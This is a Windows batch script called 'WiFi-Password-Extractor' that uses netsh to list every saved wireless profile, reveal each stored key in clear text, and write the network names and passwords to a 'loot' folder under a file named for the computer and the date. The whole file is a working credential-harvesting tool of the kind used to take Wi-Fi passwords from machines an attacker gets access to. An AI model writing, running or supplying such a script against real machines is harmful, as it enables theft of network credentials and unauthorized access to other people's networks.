@echo off
setlocal enabledelayedexpansion

CD /d "%~dp0"
SET "DIR=%CD%"
for /f %%x in ('wmic path win32_localtime get /format:list ^| findstr "="') do set %%x
SET "TODAYDATE=%Year%-%Month%-%Day%"
SET "LOG=1"
SET "LOGDIR=%DIR%\loot"
SET "LOGFILE=%LOGDIR%\%COMPUTERNAME%-%TODAYDATE%.txt"

echo.
echo ===============================================
echo    -REDD-'s WiFi-Password-Extractor 1.1b
echo       https://www.private-locker.com
echo ===============================================
echo.
if "%LOG%" EQU "1" (
	echo Extracting WiFi Passwords into: -
	echo  -- %LOGFILE%
	echo.
	echo  One Moment Please...
	echo.
	if NOT EXIST "%LOGDIR%" mkdir "%LOGDIR%"
	echo ####### START WIFI PASSWORD LOG ####### > "%LOGFILE%"
	echo #   PC Name: %COMPUTERNAME% >> "%LOGFILE%"
	echo #      TIME: %TODAYDATE% >> "%LOGFILE%"
	echo ####################################### >> "%LOGFILE%"
	echo. >> "%LOGFILE%"
	echo Displaying all valid WiFi Credentials..
	echo.
)
:main
    call :get-profiles r
    :main-next-profile
        for /f "tokens=1* delims=," %%a in ("%r%") do (
            call :get-profile-key "%%a" key
            if "!key!" NEQ "" (
                echo WiFi     : %%a
				echo Password : !key!
				echo.
				if "%LOG%" EQU "1" (
					echo WiFi     : %%a >> "%LOGFILE%"
					echo Password : !key! >> "%LOGFILE%"
					echo. >> "%LOGFILE%"
				)
				)
            set r=%%b
        )
        if "%r%" NEQ "" goto main-next-profile
    echo.
	if "%LOG%" EQU "1" (
		echo. >> "%LOGFILE%"
		echo ####################################### >> "%LOGFILE%"
	)
    pause
    goto :eof
:get-profile-key <1=profile-name> <2=out-profile-key>
    setlocal

    set result=

    FOR /F "usebackq tokens=2 delims=:" %%a in (
        `netsh wlan show profile name^="%~1" key^=clear ^| findstr /C:"Key Content"`) DO (
        set result=%%a
        set result=!result:~1!
    )
    (
        endlocal
        set %2=%result%
    )
    goto :eof
:get-profiles <1=result-variable>
    setlocal
    set result=   
    FOR /F "usebackq tokens=2 delims=:" %%a in (
        `netsh wlan show profiles ^| findstr /C:"All User Profile"`) DO (
        set val=%%a
        set val=!val:~1!

        set result=%!val!,!result!
    )
    (
        endlocal
        set %1=%result:~0,-1%
    )
    goto :eof